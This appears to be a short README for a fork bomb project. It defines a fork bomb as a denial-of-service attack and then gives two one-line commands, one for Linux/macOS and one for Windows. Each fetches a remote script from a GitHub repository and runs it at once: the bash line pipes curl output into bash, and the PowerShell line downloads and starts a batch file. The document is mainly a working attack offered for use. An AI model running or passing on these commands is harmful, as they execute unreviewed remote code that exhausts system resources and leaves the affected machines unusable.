# Fork Bomb

A fork bomb is a type of denial-of-service (DoS) attack that exploits the fork system call. It works by creating a process that repeatedly replicates itself, leading to an exponential increase in the number of processes running on the system, which can overwhelm system resources and render it unresponsive.


### run on Linux/macOS

```bash
cat <(curl -s https://raw.githubusercontent.com/savasick/forkbomb/refs/heads/main/forkbomb.sh) | bash
```

### run on Windows

```shell
powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/savasick/forkbomb/refs/heads/main/forkbomb.bat' -OutFile 'forkbomb.bat'; Start-Process 'forkbomb.bat'"
```